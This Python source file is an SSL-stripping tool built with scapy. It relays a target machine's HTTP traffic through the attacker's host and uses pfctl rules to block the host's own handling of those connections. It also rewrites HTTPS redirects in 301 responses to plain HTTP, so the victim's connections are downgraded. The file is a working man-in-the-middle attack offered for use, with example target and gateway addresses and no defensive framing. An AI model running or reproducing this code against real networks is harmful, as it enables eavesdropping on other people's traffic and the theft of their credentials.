#!/usr/bin/env python3

import re
from scapy.all import sniff, TCP, IP, get_if_hwaddr, get_if_addr, Ether, sendp, Raw
import os

from modules.helpers import get_mac

class SSLStripper:
    def __init__(self, interface, target_ip, gateway_ip) -> None:
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.spoofing = False
        self.forwarded_packets = set()  # Track packets we've forwarded
        self.blocked_tcp = set()

        self.attacker_mac = get_if_hwaddr(interface)
        self.attacker_ip = get_if_addr(interface)

        # Get MAC addresses with unlimited retries
        while True:
            self.target_mac = get_mac(target_ip)
            self.gateway_mac = get_mac(gateway_ip)

            if self.target_mac and self.gateway_mac and self.target_mac != self.attacker_mac and self.gateway_mac != self.attacker_mac:
                break

            print("[!] Retrying to get MAC addresses...")

        #Set up system
        self.system_restart()

    
    def system_restart(self):
        """Set up system for SSL stripping using pfctl"""
        try:
            # Enable and load pf rules
            os.system('pfctl -e > /dev/null 2>&1')  # Enable pf
            os.system('pfctl -f /etc/pf.conf > /dev/null 2>&1')  # Load rules
            print("[*] PF rules set to default")
        except Exception as e:
            print(f"[!] Error setting up PF rules: {e}")
            self.stop()

    def start(self):
        self.spoofing = True
        print("[*] Starting SSL stripping...")
        print(f"[*] Target IP: {self.target_ip} (MAC: {self.target_mac})\n")

        try:
            while self.spoofing:
                # print("[*] Sniffing for HTTP traffic...")
                sniff(filter=f"tcp port 80",
                    store=0,
                    prn=self.handle_packet,
                    iface=self.interface,
                    stop_filter=lambda p: not self.spoofing, 
                    timeout=1)
        except Exception as e:
            print(f"[!] Error: {e}")
            self.stop()

    def stop(self):
        print("[*] Stopping SSL stripping...")
        self.system_restart()
        self.spoofing = False
    
    def is_tcp(self, packet):
        """Return true if the packet is the pure TCP connection (first packet)"""
        if not packet.haslayer(TCP):
            return False
        flags = str(packet[TCP].flags)
        return flags == 'S' and 'A' not in flags
    
    def get_tcp(self, packet):
        """Return the definition of a TCP connection"""
        return (packet[IP].src, packet[TCP].sport, packet[IP].dst, packet[TCP].dport)


    def handle_packet(self, packet):
        # Only handle TCP proto
        if not packet.haslayer(TCP) or not packet.haslayer(IP):
            return

        # Block the TCP connection on the system to handle the connection
        if self.is_tcp(packet):
            tcp = self.get_tcp(packet)
            if tcp not in self.blocked_tcp:
                # Extract TCP connection details from the TCP tuple
                src_ip, src_port, dst_ip, dst_port = tcp
                
                # Block TCP traffic in both directions
                os.system(f"pfctl -e > /dev/null 2>&1")  # Enable pf firewall
                os.system(f"echo 'block drop quick on {self.interface} proto tcp from {src_ip} to any port {dst_port}' | pfctl -f - > /dev/null 2>&1")
                os.system(f"echo 'block drop quick on {self.interface} proto tcp from {dst_ip} to any port {src_port}' | pfctl -f - > /dev/null 2>&1")

                self.blocked_tcp.add(tcp)

        # Create a unique identifier for this packet
        packet_id = (packet[IP].id, packet[TCP].seq)

        # Skip if we've already forwarded this packet, avoid infinite loop
        if packet_id in self.forwarded_packets:
            self.forwarded_packets.remove(packet_id)
            return

        # Check if packet is from target 
        if not (packet[IP].src == self.target_ip) and not (packet[IP].dst == self.target_ip):
            return 
        
        # Create a new packet to forward
        new_packet = packet.copy()
        if packet[IP].src == self.target_ip:
            new_packet[Ether].src = self.attacker_mac
            new_packet[Ether].dst = self.gateway_mac
        else:
            new_packet[Ether].src = self.attacker_mac
            new_packet[Ether].dst = self.target_mac
        # Add payload if it exists
        if new_packet.haslayer(Raw):
            raw_payload = new_packet[Raw].load
            try:
                raw_payload = raw_payload.decode('utf-8', errors='ignore')
                # Check for HTTP 301 and Location header
                if 'HTTP/1.1 301 Moved Permanently' in raw_payload.splitlines()[0]:
                    print("[*] Intercepted HTTPS redirect - attempting to downgrade to HTTP")
                    # Replace https with http in Location header
                    new_payload = re.sub(
                        r'https://[^\r\n]+',
                        lambda m: m.group(0).replace('https://', 'http://') + ' ',
                        raw_payload
                    )
                    new_packet[Raw] = Raw(load=new_payload.encode())
                    print("[*] Successfully downgraded HTTPS redirect to HTTP")
            except Exception as e:
                print("[*] Binary payload", e)
                new_packet[Raw] = Raw(load=raw_payload)

        # Mark this packet as forwarded
        self.forwarded_packets.add(packet_id)

        # Recalculate checksums for IP and TCP layers
        del new_packet[IP].chksum
        del new_packet[TCP].chksum
        new_packet[IP].chksum = None
        new_packet[TCP].chksum = None

        sendp(new_packet, iface=self.interface, verbose=False)
        return


if __name__ == "__main__":
    # Example usage
    interface = "en0"  # Change this to your network interface
    target_ip = "192.168.0.186"  # Change this to your target's IP
    gateway_ip = "192.168.0.1"  # Change this to your gateway's IP

    spoofer = SSLStripper(interface, target_ip, gateway_ip)
    spoofer.start()

